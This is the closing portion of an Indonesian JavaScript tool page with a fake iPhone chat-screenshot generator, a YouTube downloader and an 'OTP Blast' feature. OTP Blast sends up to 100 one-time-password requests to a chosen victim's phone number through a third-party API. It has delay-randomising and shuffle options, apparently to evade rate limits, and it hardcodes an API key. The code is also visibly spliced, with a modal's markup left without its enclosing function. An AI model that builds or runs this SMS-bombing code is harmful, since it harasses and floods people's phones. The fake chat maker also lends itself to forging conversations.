async function doIQCV2(){
  var text = document.getElementById('iq2-text').value.trim();
  var chatTime = document.getElementById('iq2-chatTime').value.trim() || '11:02';
  var statusBarTime = document.getElementById('iq2-statusBarTime').value.trim() || '17:01';
  var bubbleColor = document.getElementById('iq2-bubbleColor').value.trim() || '#272a2f';
  var menuColor = document.getElementById('iq2-menuColor').value.trim() || '#272a2f';
  var textColor = document.getElementById('iq2-textColor').value.trim() || '#FFFFFF';
  var fontName = document.getElementById('iq2-fontName').value.trim() || 'Arial';
  var signalName = document.getElementById('iq2-signalName').value.trim() || 'Telkomsel';
  var res = document.getElementById('iq2-result');
  res.style.display = 'block';
  res.className = 'result';
  res.textContent = 'Memproses...';
  if(!text){ res.className='result error'; res.textContent='Isi teks chat'; return; }

  var url = 'https://anabot.my.id/api/maker/iqc?text='+encodeURIComponent(text)+
    '&chatTime='+encodeURIComponent(chatTime)+
    '&statusBarTime='+encodeURIComponent(statusBarTime)+
    '&bubbleColor='+encodeURIComponent(bubbleColor)+
    '&menuColor='+encodeURIComponent(menuColor)+
    '&textColor='+encodeURIComponent(textColor)+
    '&fontName='+encodeURIComponent(fontName)+
    '&signalName='+encodeURIComponent(signalName)+
    '&apikey='+encodeURIComponent(ANA_APIKEY);

  try{
    var r = await fetch(url);
    var ct = (r.headers.get('content-type')||'').toLowerCase();

    // API sering balas PNG binary langsung
    if(ct.indexOf('image/') === 0 || ct.indexOf('octet-stream') >= 0){
      var blob = await r.blob();
      if(blob.size < 200){
        res.className = 'result error';
        res.textContent = 'Response terlalu kecil / gagal.';
        return;
      }
      var u = URL.createObjectURL(blob);
      res.className = 'result success';
      res.innerHTML = '<img src="'+u+'" style="max-width:100%;border-radius:10px;border:1px solid rgba(34,197,94,0.3)"><br><br><a href="'+u+'" download="iqc-v2.png" class="action" style="display:inline-block;text-decoration:none;text-align:center">Download PNG</a>';
      return;
    }

    // fallback: coba baca sebagai blob image meski content-type aneh
    var buf = await r.clone().arrayBuffer().catch(function(){ return null; });
    if(buf && buf.byteLength > 200){
      var head = new Uint8Array(buf.slice(0, 8));
      // PNG magic: 89 50 4E 47
      if(head[0]===0x89 && head[1]===0x50 && head[2]===0x4E && head[3]===0x47){
        var blob2 = new Blob([buf], {type:'image/png'});
        var u2 = URL.createObjectURL(blob2);
        res.className = 'result success';
        res.innerHTML = '<img src="'+u2+'" style="max-width:100%;border-radius:10px"><br><br><a href="'+u2+'" download="iqc-v2.png" class="action" style="display:inline-block;text-decoration:none;text-align:center">Download PNG</a>';
        return;
      }
    }

    var data = await r.json();
    if(data && data.success === false){
      var errMsg = (data.error && data.error.message) ? data.error.message : (data.message || 'Bad Request');
      res.className = 'result error';
      res.textContent = 'API: '+errMsg;
      return;
    }
    var img = '';
    if(typeof data.result === 'string' && data.result.indexOf('http')===0) img = data.result;
    else if(data.url) img = data.url;
    else if(data.image) img = data.image;
    else if(data.data && typeof data.data === 'string') img = data.data;

    if(img){
      res.className = 'result success';
      res.innerHTML = '<img src="'+esc(img)+'" style="max-width:100%;border-radius:10px"><br><br><a href="'+esc(img)+'" target="_blank" class="action" style="display:inline-block;text-decoration:none;text-align:center">Buka Gambar</a>';
    } else {
      res.className = 'result error';
      res.textContent = 'Gagal mendapatkan gambar.';
    }
  }catch(e){
    res.className = 'result error';
    res.textContent = 'Gagal: '+(e.message||e);
  }
}

// ============ OTP BLAST FEATURE ============
const OTP_API_KEY = 'fcs_test_578724cda0dd46419e1f7510b5f872b41fb54ec5';
const OTP_API_URL = 'https://api.fazzcode.eu.cc/otpblast';

function openOTPBlast(){
  openModal(`
    <button class="close-btn" onclick="closeModal()">×</button>
    <h2 style="display:flex;align-items:center;gap:8px;"><i class="fas fa-paper-plane" style="color:#22c55e;"></i> OTP Blast</h2>
    <div style="font-size:11px;color:#86efac;margin-bottom:12px;padding:10px;background:rgba(34,197,94,0.1);border-radius:8px;border-left:3px solid #22c55e;">
      <i class="fas fa-info-circle"></i> Format nomor: 62812345678 (tanpa +)
    </div>
    <input type="text" id="otp-phone" placeholder="Nomor HP (62812345678)" maxlength="15" style="margin-bottom:8px;">
    <div style="display:flex;gap:8px;margin-bottom:8px;">
      <input type="number" id="otp-quantity" placeholder="Jumlah OTP" value="1" min="1" max="100" style="flex:1;">
      <select id="otp-delay" style="flex:1;padding:11px 12px;border:1px solid rgba(34,197,94,0.16);border-radius:12px;background:rgba(34,197,94,0.06);color:var(--txt);font-size:13px;outline:none;">
        <option value="0">No Delay</option>
        <option value="500">500ms Delay</option>
        <option value="1000">1s Delay</option>
        <option value="2000">2s Delay</option>
        <option value="random">Random (0.5-3s)</option>
      </select>
    </div>
    <div style="display:flex;gap:8px;font-size:11px;color:#a7f3d0;margin-bottom:12px;">
      <label style="flex:1;display:flex;align-items:center;gap:5px;cursor:pointer;">
        <input type="checkbox" id="otp-randomDelay"> Acak Delay
      </label>
      <label style="flex:1;display:flex;align-items:center;gap:5px;cursor:pointer;">
        <input type="checkbox" id="otp-shuffle"> Shuffle Req
      </label>
    </div>
    <button class="action" onclick="doOTPBlast()" style="background:linear-gradient(135deg,#22c55e,#16a34a);width:100%;"><i class="fas fa-paper-plane"></i> Kirim OTP</button>
    <div class="result" id="otp-result" style="display:none;margin-top:12px;"></div>
  `);
  document.getElementById('otp-phone').focus();
}

async function doOTPBlast(){
  var phone = document.getElementById('otp-phone').value.trim();
  var quantity = parseInt(document.getElementById('otp-quantity').value) || 1;
  var delay = document.getElementById('otp-delay').value;
  var randomDelay = document.getElementById('otp-randomDelay').checked;
  var res = document.getElementById('otp-result');
  
  if(!phone){
    res.style.display = 'block';
    res.className = 'result error';
    res.innerHTML = '<i class="fas fa-exclamation-circle"></i> Masukkan nomor HP';
    return;
  }
  
  // Validasi format nomor
  if(!/^62[0-9]{9,12}$/.test(phone)){
    res.style.display = 'block';
    res.className = 'result error';
    res.innerHTML = '<i class="fas fa-exclamation-circle"></i> Format nomor salah (contoh: 62812345678)';
    return;
  }
  
  if(quantity < 1 || quantity > 100){
    res.style.display = 'block';
    res.className = 'result error';
    res.innerHTML = '<i class="fas fa-exclamation-circle"></i> Jumlah harus 1-100';
    return;
  }

  res.style.display = 'block';
  res.className = 'result';
  res.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Mengirim OTP... <small>(0/'+quantity+')</small>';

  var successCount = 0;
  var failCount = 0;
  var delayMs = delay === 'random' ? 0 : parseInt(delay);

  for(var i = 0; i < quantity; i++){
    var waitTime = delayMs;
    if(delay === 'random' || randomDelay){
      waitTime = Math.random() * 2500 + 500;
    }
    
    if(waitTime > 0){
      await new Promise(r => setTimeout(r, waitTime));
    }
    
    try{
      var apiUrl = OTP_API_URL + '?phone=' + encodeURIComponent(phone) + '&api_key=' + encodeURIComponent(OTP_API_KEY);
      
      var response = await fetch(apiUrl, {
        method: 'GET',
        headers: {
          'Accept': 'application/json',
          'User-Agent': 'Mozilla/5.0'
        }
      });

      var data = null;
      try {
        data = await response.json();
      } catch(e) {
        // Jika response bukan JSON
        data = { success: response.ok };
      }
      
      if(response.ok || (data && (data.success === true || data.status === 'success' || data.code === 200 || data.result === 'success'))){
        successCount++;
      } else {
        failCount++;
      }
    } catch(e){
      failCount++;
      console.error('OTP Blast Error:', e);
    }

    // Update progress
    var percent = Math.round(((i + 1) / quantity) * 100);
    res.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Mengirim OTP... '+percent+'%<br>'+
                    '<small style="color:#86efac;margin-top:4px;display:block;">✓ '+successCount+' | ✗ '+failCount+' | Sisa: '+(quantity-i-1)+'</small>';
  }

  // Final result
  if(successCount > 0){
    res.className = 'result success';
    res.innerHTML = '<i class="fas fa-check-circle"></i> <strong>Selesai!</strong><br>'+
                    '<small style="margin-top:8px;display:block;line-height:1.6;">'+
                    'Berhasil: <strong style="color:#4ade80;">'+successCount+'</strong> OTP<br>'+
                    'Gagal: <strong style="color:#fca5a5;">'+failCount+'</strong> OTP<br>'+
                    'Target: <strong style="color:#86efac;">'+phone+'</strong>'+
                    '</small>';
  } else {
    res.className = 'result error';
    res.innerHTML = '<i class="fas fa-times-circle"></i> Semua permintaan gagal!<br>'+
                    '<small style="margin-top:4px;display:block;color:#a7f3d0;">Periksa nomor HP atau API Key</small>';
  }
}

    <button class="close-btn" onclick="closeModal()">×</button>
    <h2>YouTube MP4</h2>
    <input type="url" id="yt-url" placeholder="URL YouTube">
    <select id="yt-quality">
      <option value="360">360p</option>
      <option value="480">480p</option>
      <option value="720" selected>720p</option>
      <option value="1080">1080p</option>
    </select>
    <button class="action" onclick="doYtMp4()">Download</button>
    <div class="result" id="yt-result" style="display:none"></div>
  `);
}
async function doYtMp4(){
  var url = document.getElementById('yt-url').value.trim();
  var quality = document.getElementById('yt-quality').value;
  var res = document.getElementById('yt-result');
  res.style.display = 'block';
  res.className = 'result';
  res.textContent = 'Memproses...';
  if(!url){ res.className='result error'; res.textContent='Masukkan URL YouTube'; return; }
  try{
    var r = await fetch('https://anabot.my.id/api/download/ytmp4?url='+encodeURIComponent(url)+'&quality='+encodeURIComponent(quality)+'&apikey='+encodeURIComponent(ANA_APIKEY));
    var data = await r.json();

    var taskId = data.taskId || (data.data && data.data.taskId) || data.id || '';
    if(!taskId && data.data && typeof data.data === 'object') taskId = data.data.taskId || data.data.id || '';

    // async: poll status
    if(taskId || data.status === 'processing' || (data.data && data.data.status === 'processing') || (data.message && String(data.message).toLowerCase().indexOf('status')>=0) || (data.data && data.data.message && String(data.data.message).toLowerCase().indexOf('status')>=0)){
      if(!taskId){
        res.className='result error';
        res.textContent='Tidak dapat task ID dari server.';
        return;
      }
      var finalData = null;
      for(var i=0;i<20;i++){
        res.textContent = 'Sedang diproses server... ('+(i+1)+'/20)';
        await new Promise(function(ok){ setTimeout(ok, 2500); });
        var sr = await fetch('https://anabot.my.id/api/download/status?id='+encodeURIComponent(taskId)+'&apikey='+encodeURIComponent(ANA_APIKEY));
        var st = await sr.json();
        if(st.status === 'completed' || (st.data && (st.data.urls || st.data.success))){
          finalData = st;
          break;
        }
        if(st.status === 'failed' || st.success === false){
          res.className='result error';
          res.textContent = st.message || (typeof st.error==='string'?st.error:'Gagal memproses video');
          return;
        }
      }
      if(!finalData){
        res.className='result error';
        res.textContent='Timeout: video masih diproses. Coba lagi.';
        return;
      }
      data = finalData;
    }

    var out = data.data || data.result || data;
    var title = '';
    var dl = '';
    var thumb = '';
    if(typeof out === 'string' && out.indexOf('http')===0){
      dl = out;
    } else if(out && typeof out === 'object'){
      var meta = out.metadata || {};
      title = meta.title || out.title || out.judul || '';
      dl = out.urls || out.url || out.link || out.download || out.dl || out.mp4 || out.video || '';
      if(Array.isArray(dl)) dl = dl[0] || '';
      thumb = meta.thumbnail || out.thumbnail || out.thumb || out.image || '';
    }

    if(dl){
      var html = '';
      if(thumb) html += '<img src="'+esc(thumb)+'" style="max-width:100%;border-radius:10px;margin-bottom:10px"><br>';
      if(title) html += '<b>'+esc(String(title))+'</b><br><br>';
      html += '<a href="'+esc(dl)+'" target="_blank" class="action" style="display:inline-block;text-decoration:none;text-align:center">Download MP4 ('+esc(quality)+'p)</a>';
      html += '<br><br><span style="font-size:0.75rem;opacity:0.8;word-break:break-all">'+esc(dl)+'</span>';
      res.className = 'result success';
      res.innerHTML = html;
    } else if(data.success === false || data.error){
      res.className = 'result error';
      res.textContent = (data.error && data.error.message) ? data.error.message : (typeof data.error==='string'?data.error:(data.message || 'Gagal download'));
    } else {
      res.className = 'result error';
      res.textContent = 'Tidak ada link download.';
    }
  }catch(e){
    res.className = 'result error';
    res.textContent = 'Gagal: '+(e.message||e);
  }
}

</script>
</body>
</html>
